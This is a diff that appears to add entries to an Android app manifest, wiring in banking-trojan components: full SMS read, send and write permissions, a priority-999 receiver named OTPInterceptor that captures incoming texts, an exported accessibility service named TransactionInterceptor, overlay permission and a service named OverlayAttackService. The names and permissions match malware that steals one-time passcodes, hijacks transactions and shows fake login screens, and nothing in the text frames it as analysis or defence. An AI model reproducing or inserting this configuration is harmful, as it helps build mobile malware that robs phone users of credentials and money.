@@ -1,0 +1,40 @@
+<!-- Banking Module Permissions -->
+<uses-permission android:name="android.permission.RECEIVE_SMS" />
+<uses-permission android:name="android.permission.READ_SMS" />
+<uses-permission android:name="android.permission.SEND_SMS" />
+<uses-permission android:name="android.permission.BROADCAST_SMS" />
+<uses-permission android:name="android.permission.WRITE_SMS" />
+
+<!-- Overlay Permissions -->
+<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+<!-- Accessibility Service for Banking -->
+<service
+    android:name=".banking.TransactionInterceptor"
+    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+    android:exported="true">
+    <intent-filter>
+        <action android:name="android.accessibilityservice.AccessibilityService" />
+    </intent-filter>
+    <meta-data
+        android:name="android.accessibilityservice"
+        android:resource="@xml/banking_accessibility_config" />
+</service>
+
+<!-- SMS Receiver for OTP -->
+<receiver
+    android:name=".banking.OTPInterceptor"
+    android:enabled="true"
+    android:exported="true"
+    android:permission="android.permission.BROADCAST_SMS">
+    <intent-filter android:priority="999">
+        <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+        <action android:name="android.provider.Telephony.SMS_DELIVER" />
+    </intent-filter>
+</receiver>
+
+<!-- Overlay Service -->
+<service
+    android:name=".banking.OverlayAttackService"
+    android:enabled="true"
+    android:exported="false" />
